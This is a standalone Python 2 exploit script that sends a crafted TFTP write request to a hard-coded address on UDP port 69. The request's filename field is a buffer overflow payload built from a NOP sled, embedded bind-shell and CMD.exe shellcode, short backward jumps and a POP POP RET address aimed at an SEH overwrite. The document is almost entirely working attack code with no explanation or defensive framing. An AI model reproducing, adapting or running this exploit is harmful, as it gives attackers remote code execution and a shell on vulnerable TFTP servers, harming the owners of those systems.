#!/usr/bin/python
import socket
import sys
import time

IP = "192.168.0.29"
PORT = 69
TIMEOUT = 5

def send_closed_udp(MESSAGE):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(MESSAGE, (IP, PORT))
        s.close()
        return 1
    except socket.error, ecx:
        print "[!] Can't connect to %s:%d - with MSG length %d - might be due to crash" % (IP, PORT, len(MESSAGE))
        return 0

exploit = "bind"
if exploit == "bind":
    # Bind TCP - non staged - 350 characters
    buf =  ""
    buf += "\xda\xcf\xbf\x3d\x30\x4c\x4f\xd9\x74\x24\xf4\x58\x31"
    buf += "\xc9\xb1\x53\x31\x78\x17\x83\xe8\xfc\x03\x45\x23\xae"
    buf += "\xba\x49\xab\xac\x45\xb1\x2c\xd1\xcc\x54\x1d\xd1\xab"
    buf += "\x1d\x0e\xe1\xb8\x73\xa3\x8a\xed\x67\x30\xfe\x39\x88"
    buf += "\xf1\xb5\x1f\xa7\x02\xe5\x5c\xa6\x80\xf4\xb0\x08\xb8"
    buf += "\x36\xc5\x49\xfd\x2b\x24\x1b\x56\x27\x9b\x8b\xd3\x7d"
    buf += "\x20\x20\xaf\x90\x20\xd5\x78\x92\x01\x48\xf2\xcd\x81"
    buf += "\x6b\xd7\x65\x88\x73\x34\x43\x42\x08\x8e\x3f\x55\xd8"
    buf += "\xde\xc0\xfa\x25\xef\x32\x02\x62\xc8\xac\x71\x9a\x2a"
    buf += "\x50\x82\x59\x50\x8e\x07\x79\xf2\x45\xbf\xa5\x02\x89"
    buf += "\x26\x2e\x08\x66\x2c\x68\x0d\x79\xe1\x03\x29\xf2\x04"
    buf += "\xc3\xbb\x40\x23\xc7\xe0\x13\x4a\x5e\x4d\xf5\x73\x80"
    buf += "\x2e\xaa\xd1\xcb\xc3\xbf\x6b\x96\x8b\x0c\x46\x28\x4c"
    buf += "\x1b\xd1\x5b\x7e\x84\x49\xf3\x32\x4d\x54\x04\x34\x64"
    buf += "\x20\x9a\xcb\x87\x51\xb3\x0f\xd3\x01\xab\xa6\x5c\xca"
    buf += "\x2b\x46\x89\x67\x23\xe1\x62\x9a\xce\x51\xd3\x1a\x60"
    buf += "\x3a\x39\x95\x5f\x5a\x42\x7f\xc8\xf3\xbf\x80\xe7\x5f"
    buf += "\x49\x66\x6d\x70\x1f\x30\x19\xb2\x44\x89\xbe\xcd\xae"
    buf += "\xa1\x28\x85\xb8\x76\x57\x16\xef\xd0\xcf\x9d\xfc\xe4"
    buf += "\xee\xa1\x28\x4d\x67\x35\xa6\x1c\xca\xa7\xb7\x34\xbc"
    buf += "\x44\x25\xd3\x3c\x02\x56\x4c\x6b\x43\xa8\x85\xf9\x79"
    buf += "\x93\x3f\x1f\x80\x45\x07\x9b\x5f\xb6\x86\x22\x2d\x82"
    buf += "\xac\x34\xeb\x0b\xe9\x60\xa3\x5d\xa7\xde\x05\x34\x09"
    buf += "\x88\xdf\xeb\xc3\x5c\x99\xc7\xd3\x1a\xa6\x0d\xa2\xc2"
    buf += "\x17\xf8\xf3\xfd\x98\x6c\xf4\x86\xc4\x0c\xfb\x5d\x4d"
    buf += "\x32\x0d\x6f\x58\xa3\xb4\x1a\x21\xa9\x46\xf1\x66\xd4"
    buf += "\xc4\xf3\x16\x23\xd4\x76\x12\x6f\x52\x6b\x6e\xe0\x37"
    buf += "\x8b\xdd\x01\x12"
else:
    # CMD.exe - 210 bytes
    buf =  ""
    buf += "\x33\xc9\xb1\xc0\xe8\xff\xff\xff\xff\xc1\x5e\x30\x4c"
    buf += "\x0e\x07\xe2\xfa\xfd\xea\x81\x04\x05\x06\x67\x81\xec"
    buf += "\x3b\xcb\x68\x86\x5e\x3f\x9b\x43\x1e\x98\x46\x01\x9d"
    buf += "\x65\x30\x16\xad\x51\x3a\x2c\xe1\xb3\x1c\x40\x5e\x21"
    buf += "\x08\x05\xe7\xe8\x25\x28\xed\xc9\xde\x7f\x79\xa4\x62"
    buf += "\x21\xb9\x79\x08\xbe\x7a\x26\x40\xda\x72\x3a\xed\x6c"
    buf += "\xb5\x66\x60\x40\x91\xc8\x0d\x5d\xa5\x7d\x01\xc2\x7e"
    buf += "\xc0\x4d\x9b\x7f\xb0\xfc\x90\x9d\x5e\x55\x92\x6e\xb7"
    buf += "\x2d\xaf\x59\x26\xa4\x66\x23\x7b\x15\x85\x3a\xe8\x3c"
    buf += "\x41\x67\xb4\x0e\xe2\x66\x20\xe7\x35\x72\x6e\xa3\xfa"
    buf += "\x76\xf8\x75\xa5\xff\x33\x5c\x5d\x21\x20\x1d\x24\x24"
    buf += "\x2e\x7f\x61\xdd\xdc\xde\x0e\x94\x6c\x05\xd4\xe0\x8a"
    buf += "\x01\x08\x3c\x8f\x90\x91\xc2\xfb\xa5\x1e\xf9\x10\x67"
    buf += "\x4c\x21\x6b\x29\x3f\xc8\xf7\x06\x34\x1f\x3e\x5b\x70"
    buf += "\x9a\xa1\xd4\xa3\x2a\x50\x4c\xd8\xab\x14\xf7\xa2\xc0"
    buf += "\xdc\xde\xb5\xe5\x48\x6d\xda\xdb\xd7\xdf\x93\xdb\xc7"
    buf += "\xa5\xc1"

stage_4 = "\x90" * 400  + buf + "\x90" * (1446-400-len(buf))
stage_3 = "\x90" * 41 + "\xE9\x20\xFB\xFF\xFF" # get back and gain even more ~1230 bytes (skip the 000es)
stage_2 = "\xEB\xD0" + "\x90" * 2 # Not much space (4 bytes); get back and gain ~40 bytes
stage_1 = "\x4F\x48\x40" # Jump to POP POP RET; null byte added through later \x00
payload = stage_4 + stage_3 + stage_2 + stage_1
print "Payload length: %d" % (len(payload))

MSG = "\x00\x02" + payload + "\x00" + "netascii" + "\x00"

send_closed_udp(MSG)
